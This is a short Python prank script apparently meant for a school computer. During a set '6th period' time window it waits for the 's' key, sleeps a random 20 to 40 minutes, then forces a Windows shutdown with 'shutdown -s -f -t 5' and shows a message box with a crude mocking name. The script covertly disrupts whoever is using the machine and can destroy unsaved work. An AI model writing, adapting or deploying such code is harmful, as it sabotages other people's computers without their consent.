import datetime
import keyboard
import os
import time
import random
import ctypes
from datetime import datetime as datetime2
dayofWeek= datetime.datetime.today().weekday()
def is6thPeriod():
    Hour=int(datetime2.now().strftime('%H'))
    Min=int(datetime2.now().strftime('%M'))
    if dayofWeek == 2:
        if Hour == 12 and Min > 15:
            return True
        else:
            return False
    else:
        if Hour == 12 and Min > 40 or Hour == 13 and Min < 47:
            return True
        else:
            return False
while True:
    a = is6thPeriod()
    if a:
        keyboard.wait('s')
        time.sleep(random.randint(1200,2400))
        os.system('shutdown -s -f -t 5')
        ctypes.windll.user32.MessageBoxW(0, "Kachow! Kachow! BallsacK Fan Ge has broken your computer!", "Problems", 0)
        


